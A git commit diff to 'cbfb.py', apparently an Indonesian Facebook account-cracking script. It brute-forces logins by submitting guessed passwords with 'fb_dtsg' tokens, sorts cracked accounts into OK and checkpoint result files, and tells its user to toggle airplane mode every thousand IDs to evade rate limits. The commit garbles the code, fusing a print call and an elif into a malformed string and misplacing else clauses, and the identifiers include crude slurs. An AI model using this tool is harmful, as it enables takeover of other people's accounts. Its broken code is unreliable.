927a082b37ddadab070376bea2bc1817d987ccdb
daffapras <96604855+daffapras@users.noreply.github.com>
2021-12-24 18:09:22 +0700

    Update cbfb.py

--- cbfb.py
+++ cbfb.py
@@ -212,8 +212,7 @@ class ngentod:
                     def zona(zafi_=None): 
                         ind = raw_input('\n %s[?] methode : %s'%(P,K))
                         if ind == '':
-                            print("%s [!] Isi yang benar kentod "%(M));self.zona()
-                        elif ind in ('1', '01'):
+                            print("%s 1', '01'):
                             print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                             print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
@@ -392,7 +391,7 @@ class ngentod:
                     	data.update({"pass":pw})
                     else:
                     	data.update({rom.get('name'): ''})
-                else:
+                    else:
                 	data.update({rom.get('name'): rom.get('value')})
             data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
             '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
@@ -451,7 +450,7 @@ class ngentod:
                     	data.update({"pass":pw})
                     else:
                     	data.update({rom.get('name'): ''})
-                else:
+                    else:
                 	data.update({rom.get('name'): rom.get('value')})
             data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
             '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
